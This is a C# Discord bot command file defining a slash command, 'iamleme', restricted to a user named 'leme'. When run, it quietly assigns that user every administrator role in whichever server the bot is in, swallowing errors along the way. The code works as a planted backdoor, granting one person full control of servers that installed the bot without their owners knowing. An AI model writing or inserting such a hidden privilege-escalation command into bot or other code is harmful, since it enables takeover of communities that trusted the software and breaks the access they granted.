using Discord;
using Discord.Interactions;
using Discord.WebSocket;
using System;
using System.Threading.Tasks;

namespace amblflecasm.Data.Commands
{
	public class iamleme : InteractionModuleBase<SocketInteractionContext>
	{
		[RequireUser("leme")]
		[SlashCommand("iamleme", "No you're not", false, RunMode.Async)]
		public async Task IAmLeme()
		{
			IGuildUser guildUser = this.Context.User as IGuildUser;
			if (guildUser == null)
			{
				await this.RespondAsync("How did you manage this");
				return;
			}

			EmbedBuilder embedBuilder = new EmbedBuilder()
				.WithTitle("Working")
				.WithDescription("Are you though?")
				.WithColor(Color.Red);

			await this.RespondAsync(null, new Embed[] { embedBuilder.Build() });

			embedBuilder.Title = "Finished";

			bool added = false;
			foreach (SocketRole role in this.Context.Guild.Roles)
			{
				if (role.IsManaged || !role.Permissions.Administrator) continue;

				try
				{
					await guildUser.AddRoleAsync(role);

					added = true;
				} catch (Exception) { }

				await Task.Delay(500);
			}

			if (added)
			{
				embedBuilder.Color = Color.Green;
				embedBuilder.Description = "Hello, leme";
			}
			else
				embedBuilder.Description = "Sorry, leme";

			await this.ModifyOriginalResponseAsync(message => message.Embed = embedBuilder.Build());
		}
	}
}
